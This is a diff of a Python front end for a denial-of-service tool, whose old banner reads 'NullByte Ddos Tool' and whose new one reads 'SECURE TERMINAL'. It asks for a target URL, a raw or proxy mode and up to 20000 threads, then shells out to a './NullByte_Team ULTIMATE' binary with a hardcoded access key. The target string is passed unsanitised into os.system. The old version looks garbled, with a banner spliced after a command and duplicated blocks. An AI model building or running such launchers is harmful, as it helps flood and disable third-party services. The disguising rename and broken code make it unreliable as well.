@@ -1,18 +1,20 @@
 #!/usr/bin/env python3
 import os
 import sys
-import getpass
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-# Clear screen
-os.system("clear" if os.name != "nt" else "cls")
+# =========================
+# UTILS
+# =========================
+def clear():
+    os.system("clear" if os.name != "nt" else "cls")
 
-# LOGIN SCREEN
-print(Fore.RED + Style.BRIGHT + """
+def banner():
+    print(Fore.RED + Style.BRIGHT + """
 ████████████████████████████████████████████
-█        NULLBYTE Ddos Tool          █
+█        NULLBYTE SECURE TERMINAL          █
 ████████████████████████████████████████████
 █  SYSTEM STATUS : LOCKED                  █
 █  ACCESS LEVEL  : RESTRICTED              █
@@ -20,105 +22,115 @@ print(Fore.RED + Style.BRIGHT + """
 ████████████████████████████████████████████
 """)
 
-print(Fore.YELLOW + "🔐 Authentication Required\n")
-
-# PASSWORD (Hidden)
-password = getpass.getpass(Fore.CYAN + "ENTER ACCESS KEY >>> ")
-
-if password != "kaneki":
-    print(Fore.RED + "\nACCESS DENIED ❌")
-    sys.exit()
-
-print(Fore.GREEN + "\nACCESS GRANTED ✓")
-print(Fore.GREEN + "Welcome to NullByte Tool\n")
-
-# MAIN BANNER
-BANNER = """
+def main_banner():
+    print(Fore.RED + Style.BRIGHT + """
 ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗ ██╗   ██╗████████╗███████╗
 ████╗  ██║██║   ██║██║     ██║     ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝
 ██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝ ╚████╔╝    ██║   █████╗
 ██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝
 ██║ ╚████║╚██████╔╝███████╗███████╗██████╔╝   ██║      ██║   ███████╗
 ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝    ╚═╝      ╚═╝   ╚══════╝
-"""
+""")
+    print(Fore.RED + "NullByte Tool\n")
 
-print(Fore.RED + Style.BRIGHT + BANNER)
-print(Fore.RED + "NullByte Tool\n")
 
-# TARGET INPUT
-target = input(Fore.CYAN + "Target URL → ").strip()
-if not target.startswith(("http://", "https://")):
-    target = "https://" + target
+# =========================
+# LOGIN SYSTEM
+# =========================
+def login():
+    print(Fore.YELLOW + "🔐 Authentication Required\n")
+    password = input(Fore.CYAN + "ENTER ACCESS KEY >>> ")
 
-# MODE MENU
-print(Fore.RED + "\nMode:")
-print("1 — Raw")
-print("2 — Proxy list\n")
+    if password != "kaneki":
+        print(Fore.RED + "\nACCESS DENIED ❌")
+        print(Fore.RED + "Unauthorized user detected")
+        sys.exit()
 
-choice = input(Fore.CYAN + "Choose (1/2) → ").strip()
+    print(Fore.GREEN + "\nACCESS GRANTED ✓")
+    print(Fore.GREEN + "Welcome to NullByte Terminal\n")
 
-# THREAD INPUT
-threads = input(Fore.CYAN + "Threads (100-20000) → ").strip()
 
-if not threads.isdigit():
-    threads = 8000
-else:
+# =========================
+# INPUT HANDLING
+# =========================
+def get_target():
+    target = input(Fore.CYAN + "Target URL → ").strip()
+
+    if not target:
+        print(Fore.RED + "Invalid target!")
+        sys.exit()
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    return target
+
+
+def get_mode():
+    print(Fore.RED + "\nMode:")
+    print("1 — Raw")
+    print("2 — Proxy list\n")
+
+    choice = input(Fore.CYAN + "Choose (1/2) → ").strip()
+
+    if choice == "2":
+        return "proxy"
+    return "raw"
+
+
+def get_threads():
+    threads = input(Fore.CYAN + "Threads (100-20000) → ").strip()
+
+    if not threads.isdigit():
+        return "8000"
+
     threads = int(threads)
-    if threads < 100:
-        threads = 100
-    if threads > 20000:
-        threads = 20000
 
-# MODE SELECT
-file = ""
-if choice == "2":
-    mode = "proxy"
+    if threads < 100 or threads > 20000:
+        print(Fore.YELLOW + "Using default threads: 8000")
+        return "8000"
+
+    return str(threads)
+
+
+def get_proxy_file():
     file = input(Fore.CYAN + "Proxy file → ").strip() or "proxies.txt"
-else:
-    mode = "raw"
 
-# BUILD COMMAND
-cmd = f"./NullByte_Team ULTIMATE {target} {mode} {threads}"
-if file:
-    cmd += f" {file}"
+    if not os.path.exists(file):
+        print(Fore.RED + "Proxy file not found!")
+        sys.exit()
 
-print(Fore.YELLOW + f"\nLAUNCHING {mode.upper()} MODE → {threads} THREADS\n")
+    return file
 
-# RUN
-os.system(cmd)███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗ ██╗   ██╗████████╗███████╗
-████╗  ██║██║   ██║██║     ██║     ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝
-██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝ ╚████╔╝    ██║   █████╗
-██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝
-██║ ╚████║╚██████╔╝███████╗███████╗██████╔╝   ██║      ██║   ███████╗
-╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝    ╚═╝      ╚═╝   ╚══════╝
-"""
 
-print(Fore.RED + Style.BRIGHT + BANNER)
-print(Fore.RED + "NullByte Tool\n")
+# =========================
+# MAIN
+# =========================
+def main():
+    clear()
+    banner()
+    login()
+    main_banner()
 
-# TARGET INPUT
-target = input(Fore.CYAN + "Target URL → ").strip()
-if not target.startswith(("http://", "https://")):
-    target = "https://" + target
+    target = get_target()
+    mode = get_mode()
+    threads = get_threads()
 
-# MODE MENU
-print(Fore.RED + "\nMode:")
-print("1 — Raw")
-print("2 — Proxy list\n")
+    proxy_file = ""
+    if mode == "proxy":
+        proxy_file = get_proxy_file()
 
-choice = input(Fore.CYAN + "Choose (1/2) → ").strip()
-threads = input(Fore.CYAN + "Threads (100-20000) → ").strip() or "8000"
+    cmd = f"./NullByte_Team ULTIMATE {target} {mode} {threads}"
+    if proxy_file:
+        cmd += f" {proxy_file}"
 
-if choice == "2":
-    mode = "proxy"
-    file = input(Fore.CYAN + "Proxy file → ").strip() or "proxies.txt"
-else:
-    mode = "raw"
-    file = ""
+    print(Fore.RED + f"\nLAUNCHING {mode.upper()} MODE → {threads} threads\n")
 
-cmd = f"./NullByte_Team ULTIMATE {target} {mode} {threads}"
-if file:
-    cmd += f" {file}"
+    try:
+        os.system(cmd)
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\nStopped by user")
 
-print(Fore.RED + f"\nLAUNCHING {mode.upper()} MODE → {threads} threads\n")
-os.system(cmd)
+
+if __name__ == "__main__":
+    main()
